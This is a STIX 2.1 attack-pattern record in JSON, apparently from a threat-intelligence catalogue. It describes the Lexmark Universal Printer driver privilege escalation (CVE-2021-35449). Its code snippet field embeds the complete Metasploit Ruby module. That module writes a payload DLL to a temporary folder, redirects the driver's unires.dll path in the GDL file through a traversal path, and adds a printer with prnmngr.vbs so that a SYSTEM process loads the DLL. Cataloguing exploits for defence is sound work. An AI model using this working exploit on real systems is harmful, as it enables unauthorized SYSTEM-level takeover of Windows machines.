{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dd55953f-7fa4-445f-b043-847677be9705",
    "created": "2024-08-14T16:49:48.368122Z",
    "modified": "2024-08-14T16:49:48.368126Z",
    "name": "Lexmark Driver Privilege Escalation",
    "description": " Various Lexmark Universal Printer drivers as listed at advisory TE953 allow low-privileged authenicated users to elevate their privileges to SYSTEM on affected Windows systems by modifying the XML file at C:\\ProgramData\\<driver name>\\Universal Color Laser.gdl to replace the DLL path to unires.dll with a malicious DLL path.  When C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\prnmngr.vbs is then used to add the printer to the affected system, PrintIsolationHost.exe a Windows process running as NT AUTHORITY\\SYSTEM, will inspect the C:\\ProgramData\\<driver name>\\Universal Color Laser.gdl file and will load the malicious DLL from the path specified in the file. This which will result in the malicious DLL executing as NT AUTHORITY\\SYSTEM.  Once this module is finished, it will use the prnmngr.vbs script to remove the printer it added.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/lexmark_driver_privesc.rb",
            "external_id": "lexmark_driver_privesc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-35449"
        },
        {
            "source_name": "reference",
            "url": "http://support.lexmark.com/index?page=content&id=TE953"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/jacob-baines/concealed_position"
        },
        {
            "source_name": "reference",
            "url": "https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Jacob%20Baines%20-%20Bring%20Your%20Own%20Print%20Driver%20Vulnerability.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Post::Windows::Priv\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Lexmark Driver Privilege Escalation',\n        'Description' => %q{\n          Various Lexmark Universal Printer drivers as listed at advisory TE953\n          allow low-privileged authenicated users to elevate their privileges to\n          SYSTEM on affected Windows systems by modifying the XML file at\n          C:\\ProgramData\\<driver name>\\Universal Color Laser.gdl\n          to replace the DLL path to unires.dll with a malicious DLL path.\n\n          When C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\prnmngr.vbs is\n          then used to add the printer to the affected system, PrintIsolationHost.exe,\n          a Windows process running as NT AUTHORITY\\SYSTEM, will inspect the\n          C:\\ProgramData\\<driver name>\\Universal Color Laser.gdl file and will\n          load the malicious DLL from the path specified in the file. This which will\n          result in the malicious DLL executing as NT AUTHORITY\\SYSTEM.\n\n          Once this module is finished, it will use the prnmngr.vbs script\n          to remove the printer it added.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Jacob Baines', # discovery, PoC, module\n          'Shelby Pace', # original Ricoh driver module\n          'Grant Willcox' # module\n        ],\n        'References' => [\n          [ 'CVE', '2021-35449'],\n          [ 'URL', 'http://support.lexmark.com/index?page=content&id=TE953'],\n          [ 'URL', 'https://github.com/jacob-baines/concealed_position'],\n          [ 'URL', 'https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Jacob%20Baines%20-%20Bring%20Your%20Own%20Print%20Driver%20Vulnerability.pdf']\n        ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'Platform' => 'win',\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [\n          [\n            'Windows', { 'Arch' => [ ARCH_X86, ARCH_X64 ] }\n          ]\n        ],\n        'Notes' => {\n          'SideEffects' => [ ARTIFACTS_ON_DISK ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ SERVICE_RESOURCE_LOSS ]\n        },\n        'DisclosureDate' => '2021-07-15',\n        'DefaultTarget' => 0\n      )\n    )\n    register_options(\n      [OptString.new('DRIVERNAME', [false, 'The name of the Lexmark driver to exploit', ''])]\n    )\n    self.needs_cleanup = true\n  end\n\n  # Check to see if a there are Lexmark drivers in the driver store.\n  # If there are, validate that they are similar to the ones we want\n  # to exploit. The user can specify the driver they'd like to exploit\n  # as option. Otherwise, the first vulnerable driver from the driver store\n  # will be selected.\n  def check\n    res = cmd_exec('pnputil.exe /enum-drivers')\n    m = res.scan(%r{Published Name:     ([^.]*\\.inf)\\r\\nOriginal Name:      lmu.*?.inf\\r\\nProvider Name:      Lexmark International\\r\\nClass Name:         Printers\\r\\nClass GUID:         {4d36e979-e325-11ce-bfc1-08002be10318}\\r\\nDriver Version:     (\\d+)/\\d+/(\\d+) \\d+\\.\\d+\\.\\d+\\.\\d+}m)\n\n    return CheckCode::Safe('No Lexmark print drivers in the driver store') if m.empty?\n\n    # known vulnerable drivers\n    driver_list = ['Lexmark Universal v2', 'Lexmark Universal v2 XL', 'Lexmark Printer Software G2', 'Lexmark Printer Software G2 XL']\n    found_drivers = []\n\n    for path in m\n      print_status(\"Lexmark driver published at #{path[0]}\")\n      inf_text = read_file(\"C:\\\\Windows\\\\inf\\\\#{path[0]}\")\n      for driver in driver_list\n        if inf_text.include?(driver)\n          found_drivers.push(driver)\n        end\n      end\n    end\n\n    return CheckCode::Safe('None of the Lexmark drivers in the driver store are known to be vulnerable') if found_drivers.empty?\n\n    found_drivers = found_drivers.uniq\n    print_status(\"Found #{found_drivers.length} possible options:\")\n    for driver in found_drivers\n      print_status(\"\\t#{driver}\")\n    end\n\n    # select driver to exploit\n    @drvr_name = datastore['DRIVERNAME']\n    if @drvr_name.empty?\n      @drvr_name = found_drivers[0]\n      print_status(\"No user provided DRIVERNAME. Defaulting to \\\"#{@drvr_name}\\\"\")\n    else\n      return CheckCode::Safe('The user specified driver is not in the driver store') unless found_drivers.include?(@drvr_name)\n\n      print_status('The user selected driver was in the driver store')\n    end\n\n    @gdl_file = 'C:\\\\ProgramData\\\\' + @drvr_name + '\\\\Universal Color Laser.gdl'\n    CheckCode::Detected('A potentially vulnerable Lexmark print driver is available.')\n  end\n\n  def do_add_printer_vbs\n    script_cmd = \"cscript \\\"#{@script_path}\\\" -a -p \\\"#{@printer_name}\\\" -m \\\"#{@drvr_name}\\\" -r \\\"lpt1:\\\"\"\n    print_status(\"Adding printer #{@printer_name}...\")\n    cmd_exec(script_cmd)\n  end\n\n  def add_printer\n    fail_with(Failure::NotFound, 'Printer driver script not found') unless file?(@script_path)\n    fail_with(Failure::NotFound, 'No driver name set') if @drvr_name.empty?\n\n    # If the driver has never been installed, then the vulnerable file won't exist. So let's\n    # install once if necessary\n    if !file?(@gdl_file)\n      do_add_printer_vbs\n      cleanup\n    end\n\n    return CheckCode::Safe('No Lexmark GDL file found') unless file?(@gdl_file)\n\n    # dump exploit dll to disk\n    dll_data = generate_payload_dll\n    temp_path = expand_path('%TEMP%\\\\')\n    temp_path.concat(Rex::Text.rand_text_alpha(5..9))\n    temp_path.concat('.dll')\n    vprint_status(\"Writing dll to #{temp_path}\")\n    write_file(temp_path, dll_data)\n    register_files_for_cleanup(temp_path)\n\n    # replace a DLL path to one in our control\n    traversal_path = '..\\\\..\\\\..\\\\..\\\\..\\\\..'\n    traversal_path.concat(temp_path[2..])\n    text = read_file(@gdl_file)\n    new_contents = text.gsub(/unires.dll/, traversal_path)\n    write_file(@gdl_file, new_contents)\n\n    # trigger exploitaiton\n    do_add_printer_vbs\n\n    # reset the path\n    text = read_file(@gdl_file)\n    new_contents = text.gsub(traversal_path, 'unires.dll')\n    write_file(@gdl_file, new_contents)\n  rescue Rex::Post::Meterpreter::RequestError => e\n    fail_with(Failure::Unknown, \"#{e.class} #{e.message}\")\n  end\n\n  def exploit\n    fail_with(Failure::None, 'Already running as SYSTEM') if is_system?\n\n    fail_with(Failure::None, 'Must have a Meterpreter session to run this module') unless session.type == 'meterpreter'\n\n    if sysinfo['Architecture'] != payload.arch.first\n      fail_with(Failure::BadConfig, 'The payload should use the same architecture as the target driver')\n    end\n\n    @printer_name = Rex::Text.rand_text_alpha(5..9)\n    @script_path = 'C:\\\\Windows\\\\System32\\\\Printing_Admin_Scripts\\\\en-US\\\\prnmngr.vbs'\n    add_printer\n  end\n\n  def cleanup\n    print_status(\"Deleting printer #{@printer_name}\")\n    delete_cmd = \"cscript \\\"#{@script_path}\\\" -d -p \\\"#{@printer_name}\\\"\"\n    cmd_exec(delete_cmd)\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-07-15",
    "x_mitre_platforms": [
        "win'"
    ]
}